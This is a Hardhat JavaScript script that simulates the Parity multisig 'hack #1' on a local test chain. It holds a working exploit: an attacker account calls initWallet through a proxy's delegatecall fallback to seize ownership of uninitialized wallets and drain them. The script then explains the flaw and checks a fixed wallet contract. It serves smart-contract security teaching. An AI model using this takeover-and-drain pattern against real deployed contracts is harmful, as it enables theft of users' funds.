import hre from "hardhat";
const { ethers } = hre;
import { initLog, assert, eth } from "./lib.js";

async function main() {
  const { log, save } = initLog("parity1_attack.log");
  const [deployer, owner1, , , attackerEOA] = await ethers.getSigners();

  log("=".repeat(60));
  log("  PARITY HACK #1 — Unauthorized Initialization via delegatecall");
  log("=".repeat(60));

  // Shared ABI for encoding calls via fallback
  const libIface = new ethers.Interface([
    "function initWallet(address _owner)",
    "function execute(address to, uint256 value, bytes calldata data)"
  ]);

  // ─────────────────────────────────────────────────────────
  // Setup
  // ─────────────────────────────────────────────────────────
  log("\n[1] Deploying shared WalletLibraryVulnerable...");
  const Library = await ethers.getContractFactory("WalletLibraryVulnerable");
  const library = await Library.deploy();
  await library.waitForDeployment();
  log(`  Library: ${library.target}`);

  log("\n[2] Deploying 3 proxy WalletVulnerable contracts...");
  const WalletVulnerable = await ethers.getContractFactory("WalletVulnerable");
  const [wallet1, wallet2, wallet3] = await Promise.all([
    WalletVulnerable.deploy(library.target).then(w => w.waitForDeployment().then(() => w)),
    WalletVulnerable.deploy(library.target).then(w => w.waitForDeployment().then(() => w)),
    WalletVulnerable.deploy(library.target).then(w => w.waitForDeployment().then(() => w))
  ]);
  log(`  Wallet1: ${wallet1.target}`);
  log(`  Wallet2: ${wallet2.target}`);
  log(`  Wallet3: ${wallet3.target}`);

  log("\n[3] Funding each wallet with 5 ETH...");
  for (const w of [wallet1, wallet2, wallet3]) {
    await deployer.sendTransaction({ to: w.target, value: ethers.parseEther("5") });
  }
  log(`  Wallet1: ${eth(await ethers.provider.getBalance(wallet1.target))}`);
  log(`  Wallet2: ${eth(await ethers.provider.getBalance(wallet2.target))}`);
  log(`  Wallet3: ${eth(await ethers.provider.getBalance(wallet3.target))}`);

  // ─────────────────────────────────────────────────────────
  // Wallet 1 — legitimate owner initializes and withdraws
  // ─────────────────────────────────────────────────────────
  log("\n[4] Wallet1: legitimate owner (owner1) initializes via fallback → initWallet...");
  await owner1.sendTransaction({
    to: wallet1.target,
    data: libIface.encodeFunctionData("initWallet", [owner1.address])
  });
  log(`  Wallet1 owner: ${await wallet1.owner()}`);
  log(assert(await wallet1.owner() === owner1.address, "Wallet1 owner = owner1"));

  log("\n  Wallet1: owner withdraws 1 ETH via execute...");
  await owner1.sendTransaction({
    to: wallet1.target,
    data: libIface.encodeFunctionData("execute", [owner1.address, ethers.parseEther("1"), "0x"])
  });
  log(`  Wallet1 balance after 1 ETH withdraw: ${eth(await ethers.provider.getBalance(wallet1.target))}`);

  // ─────────────────────────────────────────────────────────
  // Wallet 2 & 3 — uninitialized (owner = address(0))
  // ─────────────────────────────────────────────────────────
  log("\n[5] Wallet2 and Wallet3 are uninitialized (owner = address(0))...");
  log(`  Wallet2 owner: ${await wallet2.owner()} ← zero address`);
  log(`  Wallet3 owner: ${await wallet3.owner()} ← zero address`);

  // ─────────────────────────────────────────────────────────
  // Attack
  // ─────────────────────────────────────────────────────────
  log("\n[6] ATTACK: attacker calls initWallet on Wallet2 and Wallet3 via fallback...");
  log("  (fallback → delegatecall → library.initWallet runs in proxy storage context)");

  const initAttacker = libIface.encodeFunctionData("initWallet", [attackerEOA.address]);
  await attackerEOA.sendTransaction({ to: wallet2.target, data: initAttacker });
  await attackerEOA.sendTransaction({ to: wallet3.target, data: initAttacker });

  log(`  Wallet2 owner: ${await wallet2.owner()}`);
  log(`  Wallet3 owner: ${await wallet3.owner()}`);
  log(assert(await wallet2.owner() === attackerEOA.address, "Attacker is now owner of Wallet2"));
  log(assert(await wallet3.owner() === attackerEOA.address, "Attacker is now owner of Wallet3"));

  log("\n[7] Attacker drains Wallet2 and Wallet3...");
  const drainData = libIface.encodeFunctionData("execute", [attackerEOA.address, ethers.parseEther("5"), "0x"]);
  await attackerEOA.sendTransaction({ to: wallet2.target, data: drainData });
  await attackerEOA.sendTransaction({ to: wallet3.target, data: drainData });

  const w2bal = await ethers.provider.getBalance(wallet2.target);
  const w3bal = await ethers.provider.getBalance(wallet3.target);
  log(`  Wallet2 balance: ${eth(w2bal)}`);
  log(`  Wallet3 balance: ${eth(w3bal)}`);
  log(assert(w2bal === 0n, "Wallet2 drained to 0 ETH"));
  log(assert(w3bal === 0n, "Wallet3 drained to 0 ETH"));

  log("\n" + "=".repeat(60));
  log("  VULNERABILITY EXPLANATION");
  log("=".repeat(60));
  log("  delegatecall mechanics:");
  log("    library code runs in PROXY's storage context.");
  log("    library slot 0 = 'owner' → maps to proxy slot 0 = 'owner'.");
  log("    initWallet(_owner) writes storage[0] = _owner.");
  log("    Via delegatecall: proxy.owner is overwritten.");
  log("");
  log("  Attack precondition: proxy.owner == address(0) (never initialized).");
  log("  Attacker calls initWallet(attacker) via fallback → hijacks ownership.");

  // ─────────────────────────────────────────────────────────
  // WalletFixed demo
  // ─────────────────────────────────────────────────────────
  log("\n" + "=".repeat(60));
  log("  WALLETFIXED — Protection Verification");
  log("=".repeat(60));

  const WalletFixed = await ethers.getContractFactory("WalletFixed");
  const wFixed = await WalletFixed.deploy(owner1.address);
  await wFixed.waitForDeployment();
  await deployer.sendTransaction({ to: wFixed.target, value: ethers.parseEther("5") });
  log(`  WalletFixed deployed. Owner: ${await wFixed.owner()}`);

  let reinitFailed = false;
  try {
    await attackerEOA.sendTransaction({
      to: wFixed.target,
      data: libIface.encodeFunctionData("initWallet", [attackerEOA.address])
    });
  } catch {
    reinitFailed = true;
  }
  log(`  Re-init attempt reverted: ${reinitFailed}`);
  log(assert(reinitFailed, "WalletFixed: re-initialization rejected (already initialized)"));

  let execFailed = false;
  try {
    const execIface = new ethers.Interface(["function execute(address,uint256,bytes)"]);
    await attackerEOA.sendTransaction({
      to: wFixed.target,
      data: execIface.encodeFunctionData("execute", [attackerEOA.address, ethers.parseEther("1"), "0x"])
    });
  } catch {
    execFailed = true;
  }
  log(`  Non-owner execute reverted: ${execFailed}`);
  log(assert(execFailed, "WalletFixed: non-owner execute rejected (owner only)"));
  log(`  WalletFixed balance: ${eth(await ethers.provider.getBalance(wFixed.target))} (funds safe)`);

  log("\n" + "=".repeat(60));
  log("  PARITY #1 SIMULATION COMPLETE");
  log("=".repeat(60));

  save();
}

main().catch((e) => { console.error(e); process.exit(1); });
